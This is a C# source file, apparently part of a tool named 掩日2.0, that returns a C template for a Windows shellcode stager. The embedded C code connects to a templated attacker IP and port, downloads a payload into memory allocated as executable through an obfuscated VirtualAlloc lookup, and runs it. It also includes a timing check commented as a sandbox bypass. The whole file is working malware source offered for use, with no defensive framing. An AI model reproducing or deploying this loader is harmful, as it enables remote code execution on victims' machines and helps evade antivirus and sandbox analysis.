using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace 掩日2._0
{
    class T_EasyMode
    {
        public static string code = "";
        public static string GetCode()
        {
            code = @"#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <time.h>

/* init winsock */
void winsock_init() {
	WSADATA	wsaData;
	WORD 		wVersionRequested;

	wVersionRequested = MAKEWORD(2, 2);

	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		WSACleanup();
		exit(1);
	}
}


/* attempt to receive all of the requested data from the socket */
int xxxxxx(SOCKET my_socket, void * buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	void * startb = buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;
	}
	return tret;
}

/* establish a connection to a host:port */
SOCKET wxxxxxx(char * targetip, int port) {
	struct hostent *		target;
	struct sockaddr_in 	sock;
	SOCKET 			my_socket;

	/* setup our socket */
	my_socket = socket(AF_INET, SOCK_STREAM, 0);

	/* resolve our target */
	target = gethostbyname(targetip);


	/* copy our target information into the sock */
	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	/* attempt to connect */
	connect(my_socket, (struct sockaddr *)&sock, sizeof(sock));

	return my_socket;
}


int main(int argc, char * argv[]) {
	ULONG32 size;
	char * buffer;
	void (*function)();

	winsock_init();

	/* connect to the handler */
	char* testString2 = ((char[]){{{ip}}});
	char* testString3 = ((char[]){'V','i','r','t','u','a','l','A','l','l','o','c','\0'});
	char* testString4 = ((char[]){'k','e','r','n','e','l','3','2','\0'});
	
	//绕过沙箱
	clock_t start, finish;
	double Total_time;
	start = clock();
	Sleep(800);
	finish = clock();
	
	Total_time = (double)(finish - start);
	if(Total_time < 800)
	{
		return 0;
	}
	
	
	SOCKET my_socket = wxxxxxx(testString2, {{port}});

	/* read the 4-byte length */
	recv(my_socket, (char *)&size, 4, 0);

	/* allocate a RWX buffer */
	typedef LPVOID (WINAPI* VirtualAllocB)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
	
	VirtualAllocB p = (VirtualAllocB)GetProcAddress(GetModuleHandle(testString4), testString3);
	buffer = (char*)(*p)(NULL, size+5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	/* prepend a little assembly to move our SOCKET value to the EDI register
	   thanks mihi for pointing this out
	   BF 78 56 34 12     =>      mov edi, 0x12345678 */
	buffer[0] = 0xBF;

	/* copy the value of our socket to the buffer */
	memcpy(buffer + 1, &my_socket, 4);

	/* read bytes into the buffer */
	xxxxxx(my_socket, buffer + 5, size);

	/* cast our buffer as a function and call it */
	(*(void(*)())buffer)();

	return 0;
}
";
            return code;
        }
    }
}
